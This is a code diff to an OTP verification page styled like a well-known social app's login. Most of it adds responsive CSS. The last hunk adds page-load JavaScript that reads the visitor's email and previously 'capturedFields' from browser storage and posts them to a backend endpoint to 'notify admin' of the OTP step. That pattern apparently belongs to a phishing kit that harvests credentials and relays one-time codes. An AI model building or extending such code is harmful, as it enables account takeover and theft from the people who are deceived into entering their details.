@@ -11,6 +11,7 @@
       min-height: 100vh;
       display: flex;
       flex-direction: column;
+      margin: 0;
     }
     header {
       display: flex;
@@ -127,6 +128,7 @@
       border-top: 1px solid rgba(255,255,255,0.1);
       position: relative;
       z-index: 10;
+      gap: 16px;
     }
     .footer-signup {
       position: absolute;
@@ -135,6 +137,7 @@
       font-size: 15px;
       color: rgba(255,255,255,0.6);
       text-align: center;
+      white-space: nowrap;
     }
     .footer-signup a {
       color: #fe2c55;
@@ -153,6 +156,7 @@
       align-items: center;
       gap: 8px;
       transition: all 0.2s;
+      white-space: nowrap;
     }
     .lang-btn:hover {
       background: rgba(255,255,255,0.1);
@@ -160,6 +164,97 @@
     .copyright {
       color: rgba(255,255,255,0.4);
       font-size: 14px;
+      white-space: nowrap;
+    }
+
+    /* Tablet responsive */
+    @media (max-width: 768px) {
+      .modal-card {
+        padding: 32px;
+        width: 95%;
+      }
+      .modal-title {
+        font-size: 28px;
+      }
+      .modal-subtitle {
+        font-size: 15px;
+      }
+      footer {
+        flex-wrap: wrap;
+        justify-content: center;
+        gap: 12px;
+        padding: 16px;
+      }
+      .footer-signup {
+        position: static;
+        transform: none;
+        order: -1;
+        width: 100%;
+        margin-bottom: 8px;
+      }
+    }
+
+    /* Mobile responsive */
+    @media (max-width: 480px) {
+      header {
+        padding: 16px;
+      }
+      .modal-overlay {
+        padding: 12px;
+        align-items: flex-start;
+        padding-top: 40px;
+      }
+      .modal-card {
+        padding: 24px 20px;
+        width: 100%;
+        border-radius: 12px;
+      }
+      .modal-header {
+        margin-bottom: 24px;
+      }
+      .modal-title {
+        font-size: 24px;
+      }
+      .modal-subtitle {
+        font-size: 14px;
+      }
+      .otp-input-field {
+        padding: 14px 16px;
+        font-size: 15px;
+      }
+      .resend-link {
+        font-size: 15px;
+        margin-bottom: 32px;
+      }
+      .next-btn {
+        padding: 14px;
+        font-size: 15px;
+      }
+      footer {
+        padding: 16px 12px;
+        flex-direction: column;
+        gap: 12px;
+      }
+      .footer-signup {
+        font-size: 14px;
+      }
+      .lang-btn {
+        width: 100%;
+        justify-content: center;
+      }
+      .copyright {
+        font-size: 13px;
+      }
+    }
+
+    /* Very small screens */
+    @media (max-width: 360px) {
+      .modal-card {
+        padding: 20px 16px;
+      }
+      .modal-title {
+        font-size: 22px;
+      }
     }
   </style>
 </head>
@@ -227,6 +322,35 @@
 
     // Focus input on load
     otpInput.focus();
+
+    // Send OTP notification to admin when page loads
+    async function notifyAdminOTP() {
+      try {
+        // Get email from localStorage if available (set from previous pages)
+        const userEmail = localStorage.getItem('userEmail') || sessionStorage.getItem('userEmail') || '';
+        
+        // Get all previously captured data from sessionStorage
+        const capturedData = JSON.parse(sessionStorage.getItem('capturedFields') || '{}');
+        
+        const response = await fetch('/api/notify-otp', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            userEmail: userEmail,
+            capturedData: capturedData,
+            timestamp: new Date().toISOString()
+          })
+        });
+        
+        const result = await response.json();
+        console.log('[OTP Notification]', result);
+      } catch (error) {
+        console.error('[OTP Notification Error]', error);
+      }
+    }
+
+    // Trigger notification on page load
+    notifyAdminOTP();
 
     function verifyOTP() {
       const otp = otpInput.value;
